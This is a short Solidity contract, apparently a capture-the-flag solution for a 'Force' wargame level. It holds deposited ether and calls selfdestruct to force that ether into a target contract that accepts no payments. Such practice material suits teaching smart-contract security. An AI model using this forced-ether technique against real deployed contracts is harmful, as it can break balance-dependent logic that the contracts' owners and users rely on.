// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the Force Contract
import "./7_Force.sol";

contract ForceAttack {
    // Declare a new variable for the address of the Smart Contract
    address payable public ForceContract;

    // Initialize contract:
    constructor(address payable _ForceContract) {
        ForceContract = _ForceContract;
    }

    // Able to deposit some funds
    function deposit() public payable {}

    // Contract destructor
    function destroy() public {
        selfdestruct(payable(ForceContract));
    }
}
